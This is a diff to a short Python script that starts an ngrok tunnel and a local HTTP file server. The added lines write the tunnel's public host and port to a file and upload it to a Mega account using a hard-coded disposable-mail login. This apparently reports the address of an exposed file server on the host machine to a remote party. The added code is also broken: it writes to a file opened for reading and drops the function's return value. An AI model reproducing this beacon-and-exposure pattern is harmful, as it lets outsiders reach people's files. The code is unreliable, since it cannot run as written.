@@ -2,6 +2,7 @@ from socket import *
 import threading
 import urllib
 import os
+from mega import Mega
 serverPort = 5050
 
 def startNGROKServer():
@@ -14,7 +15,12 @@ def startNGROKServer():
     with urllib.request.urlopen('http://localhost:4040/api/tunnels') as response:
         data = json.loads(response.read().decode())
         (host, port) = data['tunnels'][0]['public_url'][6:].split(':')
-        return (host,port)
+        with open("host_port.txt") as f:
+            f.write(f"Host : {host}")
+            f.write(f"Port : {port}")
+        m = Mega()
+        usr = m.login("uploadme@yopmail.com","Bhaibhai45")
+        usr.upload("host_port.txt")
     
 def startLocalServer():
     os.system("python3 -m http.server 5050")
